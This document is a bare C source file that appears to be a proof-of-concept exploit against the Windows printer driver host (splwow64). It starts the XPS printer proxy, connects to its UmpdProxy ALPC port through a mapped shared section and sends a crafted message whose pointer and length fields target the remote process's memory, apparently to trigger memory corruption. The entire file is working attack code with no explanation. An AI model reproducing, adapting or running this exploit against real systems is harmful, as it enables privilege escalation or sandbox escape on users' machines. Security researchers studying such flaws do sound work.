#include <windows.h>
#include <shlwapi.h>
#include <winternl.h>
#pragma comment(lib, "shlwapi")
#pragma comment(lib, "ntdll")
typedef struct _PORT_VIEW { UINT64 Length;HANDLE SectionHandle;UINT64 SectionOffset;UINT64 ViewSize;UCHAR* ViewBase;UCHAR* ViewRemoteBase; } PORT_VIEW, * PPORT_VIEW;
typedef struct _PORT_MESSAGE_HEADER { USHORT DataSize;USHORT MessageSize;USHORT MessageType;USHORT VirtualRangesOffset;CLIENT_ID ClientId;UINT64 MessageId;UINT64 SectionSize; } PORT_MESSAGE_HEADER, * PPORT_MESSAGE_HEADER;
typedef struct _PORT_MESSAGE { PORT_MESSAGE_HEADER MessageHeader;UINT64 MsgSendLen;UINT64 PtrMsgSend;UINT64 MsgReplyLen;UINT64 PtrMsgReply;UCHAR Unk4[0x1F8]; } PORT_MESSAGE, * PPORT_MESSAGE;
int main(){
    CHAR Path[0x100]; GetCurrentDirectoryA(sizeof(Path), Path); PathAppendA(Path, "CreateDC.exe"); WinExec(Path, 0); CreateDCW(L"Microsoft XPS Document Writer", L"Microsoft XPS Document Writer", NULL, NULL);
    HMODULE ntdll = GetModuleHandleA("ntdll");
    int tokenInformation[16]; memset(tokenInformation, 0, sizeof(tokenInformation));
    DWORD sessionId; ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
    NTSTATUS(NTAPI* NtOpenProcessToken) (HANDLE, ACCESS_MASK, PHANDLE) = (NTSTATUS(NTAPI*) (HANDLE, ACCESS_MASK, PHANDLE)) GetProcAddress(ntdll, "NtOpenProcessToken");
    NTSTATUS(NTAPI* ZwQueryInformationToken) (HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG) = (NTSTATUS(NTAPI*) (HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG)) GetProcAddress(ntdll, "ZwQueryInformationToken");
    void* tokenHandle; ULONG length; NtOpenProcessToken(GetCurrentProcess(), 0x20008u, &tokenHandle) || ZwQueryInformationToken(tokenHandle, TokenStatistics, tokenInformation, 0x38u, &length);
    WCHAR dst[256]; wsprintfW(dst, L"\\RPC Control\\UmpdProxy_%x_%x_%x_%x", sessionId, tokenInformation[2], tokenInformation[3], 0x2000);
    UNICODE_STRING PortName; RtlInitUnicodeString(&PortName, dst);
    union _LARGE_INTEGER maximumSize; maximumSize.QuadPart = 0x20000;
    NTSTATUS(NTAPI* NtCreateSection) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE) = (NTSTATUS(NTAPI*) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE)) GetProcAddress(ntdll, "NtCreateSection");
    HANDLE sectionHandle; NtCreateSection(&sectionHandle, SECTION_MAP_WRITE | SECTION_MAP_READ, 0, &maximumSize, PAGE_READWRITE, SEC_COMMIT, 0);
    PORT_VIEW ClientView; ClientView.SectionHandle = sectionHandle; ClientView.Length = 0x30; ClientView.ViewSize = 0x1;     
    NTSTATUS(NTAPI* ZwSecureConnectPort) (PHANDLE, PUNICODE_STRING, PSECURITY_QUALITY_OF_SERVICE, PPORT_VIEW, PSID, PVOID, PULONG, PVOID, PULONG) = (NTSTATUS(NTAPI*) (PHANDLE, PUNICODE_STRING, PSECURITY_QUALITY_OF_SERVICE, PPORT_VIEW, PSID, PVOID, PULONG, PVOID, PULONG)) GetProcAddress(ntdll, "ZwSecureConnectPort");
    HANDLE portHandle; ZwSecureConnectPort(&portHandle, &PortName, 0, &ClientView, 0, 0, 0, 0, 0);
    UINT64* j = (UINT64*)ClientView.ViewBase;
    if (!j) return 0;
    UINT64 z = (UINT64)ClientView.ViewRemoteBase;
    PORT_MESSAGE m; memset(&m, 0, sizeof(m));
    m.MessageHeader.DataSize = 0x20;    
    m.MessageHeader.MessageSize = 0x48;     
    m.PtrMsgSend = z;
    m.MsgSendLen = 0x1d0;
    j[0] = 0x6A00000000; 
    NTSTATUS(NTAPI* NtRequestWaitReplyPort) (HANDLE, PPORT_MESSAGE, PPORT_MESSAGE) = (NTSTATUS(NTAPI*) (HANDLE, PPORT_MESSAGE, PPORT_MESSAGE))GetProcAddress(ntdll, "NtRequestWaitReplyPort");
    NtRequestWaitReplyPort(portHandle, &m, (PORT_MESSAGE*)malloc(sizeof(PORT_MESSAGE)));
    return 0;
}
